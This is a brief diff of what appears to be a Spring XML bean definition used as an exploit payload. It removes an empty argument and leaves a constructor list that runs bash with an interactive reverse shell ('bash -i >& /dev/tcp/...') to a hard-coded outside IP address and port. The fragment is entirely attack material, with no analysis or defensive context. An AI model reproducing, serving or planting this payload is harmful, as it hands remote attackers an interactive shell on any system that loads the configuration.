@@ -8,7 +8,6 @@
             <list>
 		<value>bash</value>
 		<value>-c</value>
-		<value></value>
 		<value><![CDATA[bash -i >& /dev/tcp/103.242.3.165/35498 0>&1]]></value>
             </list>
             </constructor-arg>
